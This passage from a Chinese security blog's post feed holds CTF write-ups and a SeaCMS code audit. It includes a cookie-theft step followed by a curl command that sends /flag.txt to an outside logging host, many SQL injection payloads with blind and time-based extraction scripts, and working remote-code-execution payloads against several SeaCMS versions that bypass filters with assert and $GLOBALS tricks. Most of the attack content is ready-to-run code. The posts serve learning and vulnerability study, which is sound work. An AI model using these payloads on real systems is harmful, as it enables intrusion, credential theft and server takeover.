'Cookie':'PHPSESSID=s3dp9m5qpg6f10138g99bnt1p7; token=1B2M2Y8AsgTpgAmY7PhCfg%3D%3D' &#125;r = s.get(url,headers=headers)code = re.findall(r'=== (.*)&lt;',r.text)[0]#print(\"code:\",code)for i in range(1,9999999): if md5(str(i)).startswith(code): #print(\"md5(str(i)) ==\",md5(str(i))) #print(\"i:\",i) breakdata = &#123; 'url':'http://61.164.47.198:10001/main.php', 'code':i &#125;r2 = s.post(url,data=data,headers=headers)r2.encoding = r2.apparent_encodingprint(r2.text) 运行后可以看到页面返回提交成功的信息 接下来，回到自己服务器，查看日志内容： 成功窃取到管理员的cookie值： 1%20admin=admin_!@@!_admin_admin_hhhhh; 最后，来到命令执行exec.php页面，提交执行的命令，加上管理员的cookie，payload如下： 12345678910111213141516POST /exec.php HTTP/1.1Host: 61.164.47.198:10001Content-Length: 78Cache-Control: max-age=0Origin: http://61.164.47.198:10001Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Referer: http://61.164.47.198:10001/exec.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=s3dp9m5qpg6f10138g99bnt1p7; token=1B2M2Y8AsgTpgAmY7PhCfg%3D%3D;admin=admin_!@@!_admin_admin_hhhhh;Connection: closecommand=curl http://fw5can.ceye.io/?$(cat /flag.txt | base64)&amp;exec=1 再次访问日志，经过base64解密后获取flag值：flag{fa51320ae808c70485dd5f30337026d6}","categories":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/tags/ctf/"}]},{"title":"ringzer0ctf-sql注入","slug":"ringzer0ctf-sql注入","date":"2019-04-09T11:15:00.000Z","updated":"2019-04-09T13:21:41.429Z","comments":true,"path":"/posts/52899/","link":"","permalink":"https://Foxgrin.github.io/posts/52899/","excerpt":"拿这个平台练手一下SQL注入","text":"拿这个平台练手一下SQL注入 Most basic SQLi pattern.没有过滤，万能密码直接登录获取flag，payload： 1username=admin&amp;password=1&apos; or &apos;1&apos;=&apos;1 ACL rulezzz the world.没有过滤，联合查询注入 注数据库payload： 1username=0&apos; union select database(),2,3# 数据库名：chal2 注表payload： 1username=0&apos; union select group_concat(table_name),2,3 from information_schema.tables where table_schema=database()# 表名：c2_group,c2_group_membership,c2_user 注列payload： 1username=0&apos; union select group_concat(column_name),2,3 from information_schema.columns where table_name=&apos;c2_group&apos;# 注内容payload： 1username=0&apos; union select group_concat(id),group_concat(groupname),group_concat(description) from c2_group# flag在表c2_group中 Login portal 1用户名和密码字段都过滤了注释符#，-，%3B%00 payload： 1username=admin&apos; or &apos;1&amp;password=1 Random Login Form有注册和登录界面，猜测是SQL约束攻击 注册payload： 1new=admin+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++1&amp;new_password=123 登录payload： 1username=admin&amp;password=123 登录成功获得flag Just another login form这题LDAP注入，LDAP简单来说类似Mysql，可以理解成一个数据库，具体可以参考https://www.fujieace.com/jingyan/ldap.html search语法：attribute operator valuesearch filter options:( “&amp;” or “|” (filter1) (filter2) (filter3) …) (“!” (filter)) =(等于)查找“名“属性为“John”的所有对象，可以使用： 1(givenName=John) 这会返回“名”属性为“John”的所有对象。圆括号是必需的，以便强调 LDAP 语句的开始和结束。 &amp;(逻辑与)如果具有多个条件并且希望全部条件都得到满足，则可使用此语法。例如，如果希望查找居住在 Dallas 并且“名”为“John”的所有人员，可以使用： 1(&amp;(givenName=John)(l=Dallas)) 请注意，每个参数都被属于其自己的圆括号括起来。整个 LDAP 语句必须包括在一对主圆括号中。操作符 &amp; 表明，只有每个参数都为真，才会将此筛选条件应用到要查询的对象。 !(逻辑非)此操作符用来排除具有特定属性的对象。假定您需要查找“名”为“John”的对象以外的所有对象。则应使用如下语句： 1(!givenName=John） 此语句将查找“名”不为“John”的所有对象。请注意：! 操作符紧邻参数的前面，并且位于参数的圆括号内。由于本语句只有一个参数，因此使用圆括号将其括起以示说明 *（通配符）可使用通配符表示值可以等于任何值。使用它的情况可能是：您希望查找具有职务头衔的所有对象。为此，可以使用： 1(title=*) 这会返回“title”属性包含内容的所有对象。另一个例子是：您知道某个对象的“名”属性的开头两个字母是“Jo”。那么，可以使用如下语法进行查找： 1(givenName=Jo*) 这会返回“名”以“Jo”开头的所有对象。 高级用法eg:您需要一个筛选条件，用来查找居住在 Dallas 或 Austin，并且名为“John”的所有对象。使用的语法应当是： 1(&amp;(givenName=John)(|(l=Dallas)(l=Austin))) 所以这里LDAP注入主要利用的是通配符* payload： 1username=*&amp;password=* Po po po po postgresql题目给了提示postgresql，经过查询是关系型数据库，--+代表注释 构造payload： 1username=admin&apos;--+&amp;password=1 出现报错信息： 1ERROR: syntax error at end of input LINE 1: ...AND password = (&apos;da39a3ee5e6b4b0d3255bfef95601890afd80709&apos;)) ^ 得知需要再添加))闭合 最终payload： 1username=admin&apos;))--+&amp;password=1 Don’t mess with Noemie; she hates admin!题目给出了用户名不是admin，并且同样过滤注释符#和--和/* payload： 1username=admin&apos; or 1 or &apos;&amp;password=1 即使admin不存在，但是经过or 1之后最终结果也是1 What’s the definition of NULLsqlite注入，以下为sqlite简介： 1SQLite的，是一款轻型的数据库。sqlite存在一个叫SQLITE_MASTER的表，这与MySQL5.x的INFORMATION_SCHEMA表类似。sqlite_master 表中保存了数据库中所有表的信息，该表中比较有用的字段有“name,sql”，name字段存放的是表名，sql字段存放的是表结构。可以通过内置函数sqlite_version()获取版本信息，和其他数据库一样，通过“order by”判断长度，该数据库的注释符和ORACLE数据库一样，都是–。 题目注入点为GET方式传入的参数id，并且传入的值经过base64解密 题目给出的hint：WHERE (id IS NOT NULL) AND (ID = ? AND display = 1) 猜测后台sql语句为WHERE (id IS NOT NULL) AND (ID = base64_decode($_GET[&#39;id&#39;]) AND display = 1) 获得查询列数payload： 10) order by 3-- 查询列数为3 获得表名payload： 10) union select group_concat(name),2,3 from sqlite_master-- 表名为：flag 获得表结构payload： 10) union select group_concat(sql),2,3 from sqlite_master-- 结构：CREATE TABLE flag (content varchar(100), display int(1), id int(10)) 获得flag payload： 10) union select content,2,3 from sqlite_master-- Login portal 2同样试一下username=admin&#39;#&amp;password=，返回Wrong username / password.看样子，注释符好像没有被过滤，因为按照前面几关套路，如果过滤提示的是非法字符，那么既然没过滤注释符的话，那就说明用户名admin不存在，那么老套路username=admin&#39; or 1 or &#39;，返回Wrong password for impossibletoguess. 看样子，像是有对我们输入的参数password和查询结果的password进行对比检查，而弹出的impossibletoguess似乎就是用户名字段 验证一下猜想，试一下username=admin&#39; union select 1,2#，返回Wrong password for 1. 说明第一个字段为用户名字段，既然有回显信息，那么我们就可以很好的利用联合查询 爆表payload： 1username=admin&apos; union select group_concat(table_name),2 from information_schema.tables where table_schema=database()#&amp;password= 表名：users 爆列payload： 1username=admin&apos; union select group_concat(column_name),2 from information_schema.columns where table_name=&apos;users&apos;#&amp;password= 列名：username,password 爆用户名impossibletoguess的密码payload： 1username=admin&apos; union select group_concat(password),2 from users#&amp;password= 密码：1b2f190ad705d7c2afcac45447a31b053fada0c4 直接输入用户名和密码： 1username=impossibletoguess&amp;password=1b2f190ad705d7c2afcac45447a31b053fada0c4 登录失败，看来密码是经过加密的 长度为40的密码，看样子不像是md5加密，所以猜测是sha1加密 所以后台对比的可能是 1password == sha1($_POST[&apos;password&apos;]) 所以我们只需要通过联合注入，将第二个字段（密码字段）为$_POST[&#39;password&#39;]经过sha1加密后的值即可 最终payload： 1username=admin&apos; union select 1,sha1(1000)#&amp;password=1000 这题出的挺有意思的，收获挺大 Generate random quote注入点为GET方式提交的参数q 测试：?q=1&#39;%23无查询结果，?q=1%23，有查询结果，说明参数q无引号包裹，另外过滤了空格，用/**/代替即可 爆列数payload： 1?q=1/**/order/**/by/**/2%23 列数为2 爆表名payload： 1?q=1q=0/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()%23 表名：alkdjf4iu,quotes 爆列名payload： 1?q=0/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x616c6b646a66346975%23 这里table_name字段加上单引号查询不到结果，猜测单引号被转义了，所以转为十六进制 列名：id,flag 爆flag payload： 1?q=0/**/union/**/select/**/1,flag/**/from/**/alkdjf4iu%23 Thinking outside the box is the key测试?id=1&#39;%23和?id=1%23，返回信息SQLite Database error please try again later. 看出这是一个SQLite数据库，所以注释符是-- 测试?id=1--，正确返回信息，说明参数id无引号包裹 爆列数payload： 1?id=0 order by 2-- 查询列数为2 爆表名payload： 1?id=0%20union%20select%201,group_concat(name)%20from%20sqlite_master-- 表名：random_stuff,ajklshfajks,troll,aatroll 爆三个表分别的结构payload： 1?id=0%20union%20select%201,group_concat(sql)%20from%20sqlite_master-- 1CREATE TABLE random_stuff (id int(10), content varchar(100)),CREATE TABLE ajklshfajks (flag varchar(40)),CREATE TABLE troll (id int(10)),CREATE TABLE aatroll (id int(10)) 发现flag在表ajklshfajks中 爆flag payload： 1?id=0%20union%20select%201,flag%20from%20ajklshfajks-- No more hacking for me!题目源代码给出了提示： 1&lt;!-- urldecode(addslashes(str_replace(&quot;&apos;&quot;, &quot;&quot;, urldecode(htmlspecialchars($_GET[&apos;id&apos;], ENT_QUOTES))))) --&gt; 我们可以发现对$_GET[&#39;id&#39;]进行了两次URL解码，再加上浏览器本身就进行一次解码，所以我们可以对参数id进行URL三次编码，就可以绕过对单引号&#39;的过滤 爆列数payload： 121%252527%252520order%252520by%2525203--plain: 1&apos; order by 3-- 列数为3 爆表名payload： 120%252527%252520union%252520select%2525201%25252Cgroup_concat%252528name%252529%25252C3%252520from%252520sqlite_master--plain: 0&apos; union select 1,group_concat(name),3 from sqlite_master-- 表名：random_data 爆表结构payload： 120%252527%252520union%252520select%2525201%25252Cgroup_concat%252528sql%252529%25252C3%252520from%252520sqlite_master--plain: 0&apos; union select 1,group_concat(sql),3 from sqlite_master-- 结构：CREATE TABLE random_data (id int, message varchar(50), display int) 爆flag payload： 120%252527%252520union%252520select%2525201%25252Cgroup_concat%252528message%252529%25252C3%252520from%252520random_data--plain: 0&apos; union select 1,group_concat(message),3 from random_data-- Don’t Stumble in the Process这题链接到了别的网站，注入点在GET方式传入的参数id，测试发现过滤了关键字union,sleep,并且没有报错信息，测试if未被过滤，所以根据有无返回结果进行基于布尔型的盲注 py脚本代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566import requestsurl = \"http://challenges.ringzer0team.com:10291?id=\"right = \"The beautiful goat will be forsaken. In the city of the mountain, a goat of the mountain will rise. The goat of the day will court the count of war.\"database = \"\"table_name = \"\"column_name = \"\"flag = \"\"ID = \"\"quote = \"\"f = 0#注数据库名:sqli291_2for i in range(1,50): for j in range(33,127): payload = \"1 and if(ascii(substr(database(),%d,1))=%d,1,0)\"%(i,j) r_url = url + payload print(r_url) r = requests.get(r_url) if right in r.text: database = database + chr(j) print(database) f = 1 break if j == 126 and f == 0: break else: f = 0print(\"database:\",database)#注表名:propheciesfor i in range(1,50): for j in range(33,127): payload = \"1 and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d,1,0)\"%(i,j) r_url = url + payload print(r_url) r = requests.get(r_url) if right in r.text: table_name = table_name + chr(j) print(table_name) f = 1 break if j == 126 and f == 0: break else: f = 0print(\"table_name:\",table_name)#注列名:id,quotefor i in range(1,50): for j in range(33,127): payload = \"1 and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='prophecies'),%d,1))=%d,1,0)\"%(i,j) r_url = url + payload print(r_url) r = requests.get(r_url) if right in r.text: column_name = column_name + chr(j) print(column_name) f = 1 break if j == 126 and f == 0: break else: f = 0print(\"column_name:\",column_name) 但是这题没有注出flag Generate random quote again源代码给出了提示&lt;!-- &lt;input type=&quot;hidden&quot; name=&quot;debug&quot; value=&quot;false&quot; /&gt; --&gt; 但是一开始这题还是毫无头绪，测试&#39;都无法出现报错，猜不出两个参数q和s分别的作用 看到别人的提示才知道，原来后台的SQL语句为： 1SELECT quote FROM quotes WHERE id = 'htmlspecialchars($id)' AND LENGTH(quote) &lt; CAST('$s' AS INT) 题目给出的参数debug如果设置为true，则可以出现SQL语法报错 由于htmlspecialchars函数，导致单引号会被转化为html实体，而\\是不会被转化的，所以当$id=1\\时，SQL语句就变成了 1SELECT quote FROM quotes WHERE id = &apos;1\\&apos; AND LENGTH(quote) &lt; CAST(&apos;$s&apos; AS INT) 相当于查询字段id值为1\\&#39; AND LENGTH(quote) &lt; CAST(，即查询id=1 而我们在通过%23注释掉$s后面的语句，就可以直接进行联合注入，另外这里union需要双写 注表payload： 1q=0\\&amp;s=uunionnion%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23 表名：qdyk5,quotes 注列payload： 1q=0\\&amp;s=uunionnion%20select%201,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x7164796b35%23 列名：id,flag 注flag payload： 1q=0\\&amp;s=uunionnion%20select%201,flag%20from%20qdyk5%23 Login portal 3测试当用户名存在，密码错误时提示Invalid username / password.，用户名不存在时提示No user found. 测试用户名：admin&#39;%23，提示No user found.，猜测注释符#被过滤了，再尝试admin&#39; or &#39;1，提示Invalid username / password. 因为没有回显信息，所以无法使用联合注入，加上sleep也被过滤了，所以这关只能采用基于布尔型的盲注，根据提示信息来判断 payload： 1username=admin&apos; and if(ascii(substr(database(),1,1))=100,1,0) or &apos;&amp;password=123 脚本代码如下： 123456789101112131415161718192021222324252627282930import requestsurl = \"https://ringzer0ctf.com/challenges/5\"headers = &#123; 'Cookie':'PHPSESSID=hh2nu3p191c1p294ufuu6n53p7' &#125;right = \"Invalid username / password.\"password = \"\"for i in range(1,50): for j in range(48,123): print('checking',chr(j)) data = &#123; 'username':\"admin' and if(ascii(substr((select password from users),%d,1))=%d,1,0) or '\"%(i,j), 'password':'123' &#125; r = requests.post(url,data=data,headers=headers) if right in r.text: password = password + chr(j) print(\"password:\",password) f = 1 break if j == 122 and f == 0: break else: f = 0print(\"password:\",password)#password: SQL1nj3ct10nFTW 登录成功后获得flag Lite login portal这题用户名存在和不存在时回显的信息跟上一关一样，不过多了个报错信息，测试admin&#39;时得到报错信息： 1SQLite Database error please try again later. Impossible to fetch username &amp; password from users table 直接得知了表名users和字段名username,password 测试admin&#39; or &#39;1，回显Invalid username / password. 同样跟上一关一样用布尔盲注，不过这里是SQLite数据库，payload略有不同： 1username=admin&apos; and substr(,1,1)=&apos;a&apos; or &apos;&amp;password=123 脚本代码如下： 123456789101112131415161718192021222324252627282930import requestsurl = \"https://ringzer0ctf.com/challenges/19\"headers = &#123; 'Cookie':'PHPSESSID=hh2nu3p191c1p294ufuu6n53p7' &#125;right = \"Invalid username / password.\"password = \"\"for i in range(1,50): for j in range(48,123): print('checking',chr(j)) data = &#123; 'username':\"admin' and substr((select password from users),%d,1)='%s' or '\"%(i,chr(j)), 'password':'123' &#125; r = requests.post(url,data=data,headers=headers) if right in r.text: password = password + chr(j) print(\"password:\",password) f = 1 break if j == 122 and f == 0: break else: f = 0print(\"password:\",password)#password: 4dm1nzP455 登录成功后获得flag Internet As A Service看别人提示的payload： 1?s=1&apos; || 1e0union select schema_name,2,3 from information_schema.schemata%23 没搞得太懂，1e0union貌似是为了绕过%20union的过滤 数据库名：iaas 注表payload： 1?s=1&apos; || 1e0union select table_name,2,3 from information_schema.tables where table_schema like &apos;iaas&apos;%23 表名：iaas,rz_flag 注列payload： 1?s=1&apos; || 1e0union select column_name,2,3 from information_schema.columns where table_name like &apos;rz_flag&apos;%23 列名：flag 1?s=1&apos; || 1e0union select flag,2,3 from rz_flag%23 Login portal 4这题不论用户名是否存在，密码错误都会返回Invalid username / password.尝试用户名username=admin&#39; or &#39;1，提示非法字符，猜测过滤了or+空格+任意字符，可以用||代替or 这题只能用延时注入，payload如下： 1username=&apos; || if(ascii(substr((select password from users),1,1))=100,sleep(3),1) || &apos;&amp;password=1 脚本代码如下： 12345678910111213141516171819202122232425262728import requestsurl = \"https://ringzer0ctf.com/challenges/6\"headers = &#123; 'Cookie':'PHPSESSID=hh2nu3p191c1p294ufuu6n53p7' &#125;password = \"\"f = 0for i in range(1,50): for j in range(48,123): print(\"checking\",chr(j)) data = &#123; 'username':\"' || if(ascii(substr((select password from users),%d,1))=%d,sleep(5),1) || '\"%(i,j), 'password':'1' &#125; try: r = requests.post(url,data=data,headers=headers,timeout=4.5) except: password = password + chr(j) print(\"password:\",password) f = 1 break if f == 0 and j == 122: break f = 0print(\"password:\",password) 成功登录后获取flag","categories":[{"name":"sql","slug":"sql","permalink":"https://Foxgrin.github.io/categories/sql/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://Foxgrin.github.io/tags/sql/"}]},{"title":"代码审计--seacms命令执行漏洞（6.45后续版本）","slug":"代码审计-seacms命令执行漏洞（6.45后续版本）","date":"2019-04-03T08:15:00.000Z","updated":"2019-04-06T02:49:11.598Z","comments":true,"path":"/posts/10257/","link":"","permalink":"https://Foxgrin.github.io/posts/10257/","excerpt":"继续跟踪海洋cms 6.45后续版本是否修复命令执行漏洞","text":"继续跟踪海洋cms 6.45后续版本是否修复命令执行漏洞 seacms 6.54参考链接：漏洞预警 | 海洋CMS（SEACMS）0day漏洞预警 在之前的6.45版本中，由于服务器未对参数$order进行合理的过滤：$order = !empty($order)?$order:time;,导致$order内容替换模板$content内容：$content = str_replace(&quot;{searchpage:ordername}&quot;,$order,$content);，之后$content内容传入parseIf函数，通过正则匹配规则{if:(.*?)}(.*?){end if}匹配后的内容传入命令执行函数@eval(&quot;if(&quot;.$strIf.&quot;) { \\$ifFlag=true;} else{ \\$ifFlag=false;}&quot;);，最终导致了getshell 这次我继续跟踪6.54版本，首先看一下它的更新日志 123456789101112更新日期：2017年8月7日 v6.54修复：紧急修复2处高危安全漏洞更新日期：2017年8月6日 v6.53新增：微信公众平台模块优化：采集逻辑修复：部分文字描述错误更新日期：2017年2月18日 v6.46修复：两处安全问题更新日期：2017年2月6日 v6.45修复：一处安全问题 审计后发现，与6.45版本不同的是，6.54版本中/search.php的第65行对参数$order进行了白名单的过滤 1$order = ($order == \"commend\" || $order == \"time\" || $order == \"hit\") ? $order : \"\"; 看似成功修复了6.45版本的order参数导致的命令执行getshell漏洞，但是本质上还是未对该漏洞进行修复，order参数只是6.45版本中最好利用的命令注入点，并不代表其他参数不存在注入点 下面我们再重新梳理一遍该cms对用户输入的过滤点，首先是全局文件/include/common.php的转义处理 1234foreach(Array('_GET','_POST','_COOKIE') as $_request)&#123; foreach($$_request as $_k =&gt; $_v) $&#123;$_k&#125; = _RunMagicQuotes($_v);&#125; 第二个是在/search.php本文件下对用户输入参数的过滤，包括RemoveXSS函数过滤和最多20字符的限制 123456$jq = RemoveXSS(stripslashes($jq));$jq = addslashes(cn_substr($jq,20));$area = RemoveXSS(stripslashes($area));$area = addslashes(cn_substr($area,20));... 虽然一个参数无法绕过这些过滤，但是我们知道模板内容替换的参数不止一个，所以，可以用多个参数组合替换的方法进行getshell 下面贴上参考文章抓取的攻击payload 12POSTsearchtype=5&amp;searchword=&#123;if&#123;searchpage:year&#125;&amp;year=:e&#123;searchpage:area&#125;&#125;&amp;area=v&#123;searchpage:letter&#125;&amp;letter=al&#123;searchpage:lang&#125;&amp;yuyan=(join&#123;searchpage:jq&#125;&amp;jq=($_P&#123;searchpage:ver&#125;&amp;&amp;ver=OST[9]))&amp;9[]=ph&amp;9[]=pinfo(); 可以看到，注入点已经不止一个，也不是之前的order 12345678910111213141516171819function echoSearchPage()&#123;...... $content = str_replace(\"&#123;searchpage:page&#125;\",$page,$content); $content = str_replace(\"&#123;seacms:searchword&#125;\",$searchword,$content); $content = str_replace(\"&#123;seacms:searchnum&#125;\",$TotalResult,$content); $content = str_replace(\"&#123;searchpage:ordername&#125;\",$order,$content);...... $content = str_replace(\"&#123;searchpage:year&#125;\",$year,$content); $content = str_replace(\"&#123;searchpage:area&#125;\",$area,$content); $content = str_replace(\"&#123;searchpage:letter&#125;\",$letter,$content); $content = str_replace(\"&#123;searchpage:lang&#125;\",$yuyan,$content); $content = str_replace(\"&#123;searchpage:jq&#125;\",$jq,$content); ...... $content = str_replace(\"&#123;searchpage:state&#125;\",$state2,$content); $content = str_replace(\"&#123;searchpage:money&#125;\",$money2,$content); $content = str_replace(\"&#123;searchpage:ver&#125;\",$ver,$content);...... $content=$mainClassObj-&gt;parseIf($content); 以上是/search.php文件中对模板内容{searchpage:}替换payload所用参数的顺序，根据上面的payload，最终替换的$content内容包含了 {if:eval(join($_POST[9]))} 然后传入parseIf函数中的命令执行函数eval，最终执行eval(&quot;if(eval(join($_POST[9])))&quot;)，下面是最终执行的效果图 虽然是通过多个参数拼接起来，但是最关键的注入点还是在于参数$searchword，所以，根据参考文章中的修复方法是过滤参数$searchword中的{searchpage:内容 1if(strpos($searchword,'&#123;searchpage:')) exit; seacms 6.55拿到6.55版本源码，直接按6.54的payload测试，发现行不通，看来有进行一些修复，审计完，对比6.54，一方面还是对参数$order进行了一个白名单过滤，位置在/search.php第66-67行 12$orderarr=array('id','idasc','time','timeasc','hit','hitasc','commend','commendasc','score','scoreasc');if(!(in_array($order,$orderarr)))&#123;$order='time';&#125; 当然，在6.54我们就已经分析过，造成漏洞的注入点不仅仅只有参数$order一个，还可以通过各个参数拼接 另外，在parseIf加入了对$content匹配内容结果数组$iar也进行了黑名单过滤 1234foreach($iar as $v)&#123; $iarok[] = str_replace(array('unlink','opendir','mysqli_','mysql_','socket_','curl_','base64_','putenv','popen(','phpinfo','pfsockopen','proc_','preg_','_GET','_POST','_COOKIE','_REQUEST','_SESSION','eval(','file_','passthru(','exec(','system(','shell_'), '@.@', $v); &#125; $iar = $iarok; 可以看到，我们之前payload的eval,_POST都在黑名单数组中，最后被替换成了@.@，所以原来payload肯定是行不通的，那么，是否真的解决了安全问题呢，其实并没有，我们仔细看黑名单内容，就能发现，其实这里只过滤了一个php执行函数eval，assert函数并没有被过滤。另外，虽然_GET,_POST,_COOKIE,_REQUEST被过滤，但是_SERVER没有被过滤。所以，过滤并不完整，还是可以通过拼接参数的方法进行getshell，只不过换一个函数和全局变量罢了，payload如下： 1234POST /seacms6.55/search.php?phpinfo();...searchtype=5&amp;searchword=&#123;if&#123;searchpage:year&#125;&amp;year=:a&#123;searchpage:area&#125;&#125;&amp;area=s&#123;searchpage:letter&amp;letter=ser&#123;searchpage:lang&#125;&amp;yuyan=t(&#123;searchpage:jq&#125;&amp;jq=$_S&#123;searchpage:ver&#125;&#125;&amp;&amp;ver=ERVER[QUERY_STRING]) 最后的执行效果： 所以，修复方法也还是需要针对参数searchword的{searchpage:内容 seacms 6.616.61版本同样对参数$order进行了白名单过滤 12$orderarr=array('id','idasc','time','timeasc','hit','hitasc','commend','commendasc','score','scoreasc'); if(!(in_array($order,$orderarr)))&#123;$order='time';&#125; 并且同样在parseIf函数中对$iar匹配数组进行了黑名单过滤 1234foreach($iar as $v)&#123; $iarok[] = str_ireplace(array('unlink','opendir','mysqli_','mysql_','socket_','curl_','base64_','putenv','popen(','phpinfo','pfsockopen','proc_','preg_','_GET','_POST','_COOKIE','_REQUEST','_SESSION','_SERVER','assert','eval(','file_','passthru(','exec(','system(','shell_'), '@.@', $v); &#125; $iar = $iarok; 我们可以发现这个版本的黑名单相对于6.55版本添加过滤了关键字assert和_SERVER 但是，在search.php中，又新添加了针对于6.54和6.55漏洞提出者提议的过滤： 1if(strpos($searchword,'&#123;searchpage:')) &#123;ShowMsg('请勿输入危险字符！','index.php','0',$cfg_search_time*1000);exit;&#125; 即对参数$searchword的内容{searchpage:进行了过滤 这次的过滤可谓是比较全面的了，不仅仅是参数$order，也过滤了参数拼接，看似已经很安全，但是还是有大佬挖出来了，emmm再次不得不感叹有输入的地方就可能存在漏洞，百密一疏都可能导致漏洞的发生 贴上参考链接：CVE-2018-14421——Seacms后台getshell分析 参考链接给出的漏洞处在后台管理-&gt;添加影片-&gt;图片地址 1&#123;if:1)$GLOBALS[&apos;_G&apos;.&apos;ET&apos;][a]($GLOBALS[&apos;_G&apos;.&apos;ET&apos;][b]);//&#125;&#123;end if&#125; 之后访问/detail/?1.html&amp;a=assert&amp;b=phpinfo();，/search.php?searchtype=5&amp;a=assert&amp;b=phpinfo();都可以成功getshell 先验证一下 添加后访问 都成功，说明payload有效，我们观察一下payload，其实挺像我们在6.45版本中$order参数的注入内容，所以猜测同样是替换模板进行命令执行的，但这都是猜测，要真正弄懂还是要一步步跟踪到漏洞根源 首先我们先抓包获取我们注入payload的参数名 参数名为v_pic，并且接收该参数的文件名：/backend/admin_video.php?action=save&amp;acttype=add也知道了，那么接下来只需要在该文件中搜索关键字v_pic即可 在111行：$v_pic = cn_substrR($v_pic,255);获取该参数值，cn_substrR只是一个截取255长度的函数，不需要关注 之后在117行处： 我们可发现参数$v_pic拼接至变量$insertSql后添加到数据库中，到这里数据就添加成功了，也就是说，后台对我们输入的内容除了截取255长度的处理外无其他处理，此时，payload已经入库 之后我们在后台管理-&gt;管理影片 可以发现，我们添加的影片内容，在/detail/?1.html下可以访问，那么老样子，直接搜索关键字v_pic，在101行中搜索到：$v_pic=$row[&#39;v_pic&#39;];，跟踪变量$row，在23行中搜索到：$row=$dsql-&gt;GetOne(&quot;Select d.*,p.body as v_playdata,p.body1 as v_downdata,c.body as v_content Fromsea_datad left joinsea_playdatap on p.v_id=d.v_id left joinsea_contentc on c.v_id=d.v_id where d.v_id=&#39;$vId&#39;&quot;) 即从数据库中取出我们之前添加的$v_pic，之后在102行中： 123456if(!empty($v_pic))&#123; if(strpos(' '.$v_pic,'://')&gt;0)&#123; $content=str_replace(\"&#123;playpage:pic&#125;\",$v_pic,$content); &#125;else&#123; $content=str_replace(\"&#123;playpage:pic&#125;\",'/'.$GLOBALS['cfg_cmspath'].ltrim($v_pic,'/'),$content); &#125; 进行熟悉的模板内容替换，果然如之前猜测的一样，再搜索关键字parseIf，在161行中搜索到：$content=$mainClassObj-&gt;parseIf($content); 接下来，只需要找到模板文件，就能弄清楚替换后内容，模板文件为：/templets/default/html/content.html，搜索关键字{playpage:pic}，在第22行中搜索到： 1&lt;a class=&quot;videopic&quot; href=&quot;&#123;playpage:playlink&#125;&quot; title=&quot;&#123;playpage:name&#125;&quot; style=&quot;background: url(&#123;playpage:pic&#125;) no-repeat; background-position:50% 50%; background-size: cover;&quot;&gt; 所以，我们替换的内容即为： 1&lt;a class=&quot;videopic&quot; href=&quot;&#123;playpage:playlink&#125;&quot; title=&quot;&#123;playpage:name&#125;&quot; style=&quot;background: url(&#123;if:1)$GLOBALS[&apos;_G&apos;.&apos;ET&apos;][a]($GLOBALS[&apos;_G&apos;.&apos;ET&apos;][b]);//&#125;&#123;end if&#125;) no-repeat; background-position:50% 50%; background-size: cover;&quot;&gt; 替换后进入parseIf函数匹配到的内容即为：{if:1)$GLOBALS[&#39;_G&#39;.&#39;ET&#39;][a]($GLOBALS[&#39;_G&#39;.&#39;ET&#39;][b]);//}{end if}，进入命令执行的内容为： 1@eval(\"if(1)$GLOBALS['_G'.'ET'][a]($GLOBALS['_G'.'ET'][b]);//)&#123; \\$ifFlag=true;&#125; else&#123; \\$ifFlag=false;&#125;\"); 在前面的分析中，我们知道parseIf函数中添加过滤了assert和_SERVER，但是还有个全局变量$GLOBALS未被过滤，它一个包含了全部变量的全局组合数组，变量的名字就是数组的键。也就是说$GLOBALS[&#39;_GET&#39;]就相当于$_GET ，那么$GLOBALS[&#39;_G&#39;.&#39;ET&#39;][a]就相当于$_GET[&#39;a&#39;]，$GLOBALS[&#39;_G&#39;.&#39;ET&#39;][a]($GLOBALS[&#39;_G&#39;.&#39;ET&#39;][b]);，?a=assert&amp;b=phpinfo();就相当于assert(phpinfo();); 最后附上参考链接的总结图：","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://Foxgrin.github.io/categories/代码审计/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"https://Foxgrin.github.io/tags/代码审计/"}]},{"title":"代码审计--seacms6.45前台getshell","slug":"代码审计-seacms6.45前台getshell","date":"2019-04-02T11:15:00.000Z","updated":"2019-04-02T13:45:56.033Z","comments":true,"path":"/posts/23000/","link":"","permalink":"https://Foxgrin.github.io/posts/23000/","excerpt":"这次上海ctf的web题中出现了之前bugku也有的经典海洋cms命令执行漏洞，趁着比赛刚结束刚好对海洋cms漏洞进行审计复现","text":"这次上海ctf的web题中出现了之前bugku也有的经典海洋cms命令执行漏洞，趁着比赛刚结束刚好对海洋cms漏洞进行审计复现 全局审计首先对网站的全局文件进行审计，在根目录文件/index.php中跟踪全局文件/include/common.php 12345#common.php 第45-48行foreach(Array('_GET','_POST','_COOKIE') as $_request)&#123; foreach($$_request as $_k =&gt; $_v) $&#123;$_k&#125; = _RunMagicQuotes($_v);&#125; 发现对GET,POST,COOKIE的键值取出作为新的变量，并对键值通过_RunMagicQuotes函数进行过滤，跟踪该函数 12345678910111213141516#common.php 第29-43行function _RunMagicQuotes(&amp;$svar)&#123; if(!get_magic_quotes_gpc()) &#123; if( is_array($svar) ) &#123; foreach($svar as $_k =&gt; $_v) $svar[$_k] = _RunMagicQuotes($_v); &#125; else &#123; $svar = addslashes($svar); &#125; &#125; return $svar;&#125; 